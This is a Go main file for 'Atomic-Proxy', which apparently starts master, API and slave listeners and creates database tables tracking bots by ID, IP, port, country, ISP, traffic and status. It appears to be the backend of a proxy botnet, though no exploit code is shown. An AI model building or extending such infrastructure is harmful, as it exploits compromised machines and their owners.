package main

import (
	"fmt"
	"log"
)

var buildversion = 9.2

func main() {
	fmt.Printf("Welcome back! Atomic-Proxy Version %s\r\n", Version)

	if err := OpenConfig(Options, "assets", "server.toml"); err != nil {
		log.Fatalf("Config: %v", err)
	}

	if err := SpawnSQL(); err != nil {
		log.Fatalf("Database: %v", err)
	}

	// Initialize database tables
	initProxyTables()

	// Start background workers
	go StartCleanupWorker()
	go ProxyHealthCheck()

	// Start servers
	go Master()
	go NewAPI()
	go Title()

	// Execute the main slave listener
	if err := Slave(); err != nil {
		log.Fatalf("Slave listener: %v", err)
	}
	select {}
}

func initProxyTables() {
	// Create proxy_stats table if not exists
	_, err := database.Exec(`CREATE TABLE IF NOT EXISTS proxy_stats (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		bot_id TEXT NOT NULL,
		ip TEXT NOT NULL,
		port INTEGER NOT NULL,
		country TEXT DEFAULT 'Unknown',
		city TEXT DEFAULT 'Unknown',
		isp TEXT DEFAULT 'Unknown',
		connections_total INTEGER DEFAULT 0,
		connections_active INTEGER DEFAULT 0,
		bytes_sent INTEGER DEFAULT 0,
		bytes_received INTEGER DEFAULT 0,
		uptime INTEGER DEFAULT 0,
		status TEXT DEFAULT 'idle',
		last_seen INTEGER NOT NULL,
		created_at INTEGER NOT NULL
	)`)
	if err != nil {
		log.Printf("Warning: Could not create proxy_stats table: %v", err)
	}

	// Create proxy_logs table
	_, err = database.Exec(`CREATE TABLE IF NOT EXISTS proxy_logs (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		bot_id TEXT NOT NULL,
		action TEXT NOT NULL,
		details TEXT,
		timestamp INTEGER NOT NULL
	)`)
	if err != nil {
		log.Printf("Warning: Could not create proxy_logs table: %v", err)
	}

	// Create indexes
	database.Exec(`CREATE INDEX IF NOT EXISTS idx_proxy_bot_id ON proxy_stats(bot_id)`)
	database.Exec(`CREATE INDEX IF NOT EXISTS idx_proxy_status ON proxy_stats(status)`)
	database.Exec(`CREATE INDEX IF NOT EXISTS idx_proxy_last_seen ON proxy_stats(last_seen)`)
	database.Exec(`CREATE INDEX IF NOT EXISTS idx_logs_bot_id ON proxy_logs(bot_id)`)
	database.Exec(`CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON proxy_logs(timestamp)`)

	log.Println("Proxy database tables initialized")
}
